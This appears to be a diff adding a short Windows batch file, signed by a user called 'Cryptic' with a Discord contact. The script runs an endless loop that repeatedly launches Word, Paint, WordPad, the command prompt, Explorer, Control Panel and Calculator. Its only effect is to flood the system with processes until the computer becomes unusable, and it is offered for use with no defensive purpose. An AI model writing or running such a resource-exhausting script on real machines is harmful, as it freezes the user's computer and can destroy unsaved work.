@@ -1,0 +1,15 @@
+@echo off
+:x
+start winword
+start mspaint
+start write
+start cmd
+start explorer
+start control
+start calc
+goto x
+
+
+ALL CODE POSTED ON THIS GITHUB IS MADE BY CRYPTIC
+
+IF YOU NEED HELP WITH ANY CODE DM ! Cryptic#2303
